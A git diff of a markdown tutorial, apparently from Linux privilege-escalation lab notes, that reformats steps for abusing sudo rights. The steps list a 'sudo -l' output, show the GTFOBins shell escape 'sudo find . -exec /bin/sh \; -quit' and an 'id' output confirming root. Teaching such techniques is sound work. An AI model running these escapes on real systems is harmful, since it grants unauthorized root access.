@@ -160,15 +160,14 @@ Now switch to the newroot user, using the new password:
              step 2: run shell escape according to your listed programs that was the result of sudo -l command 
 
 
-' Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+☑️Attension Please : Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
 Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
 
-Webite Name For shell Escape : GTFPBins '
 
 #### Example :
    
-Step 1 :
+#### Step 1 :
               sudo - l 
 
      Matching Defaults entries for user on this host:
@@ -187,20 +186,20 @@ Step 1 :
          (root) NOPASSWD: /usr/sbin/apache2
          (root) NOPASSWD: /bin/more
 
-Ok  , that's great  . Now check all listed program escape shell from GTFOBins  one by one .
+ Ok  , that's great  . Now check all listed program escape shell from GTFOBins  one by one .
 
-Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
+#### Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
         
          GTFOBins Result :
  
                         sudo find . -exec /bin/sh \; -quit
 
-Step 3: Copy the shell escape of GTFOBins and paste it on your terminal 
+#### Step 3: Copy the shell escape of GTFOBins and paste it on your terminal 
 
      user@debian:~$ sudo find . -exec /bin/sh \; -quit
      sh-4.1# 
  
- Step 4: Wow, you did well . Now , use id command and see you are now root 🥰
+#### Step 4: Wow, you did well . Now , use id command and see you are now root 🥰
 
      sh-4.1# id
      uid=0(root) gid=0(root) groups=0(root)
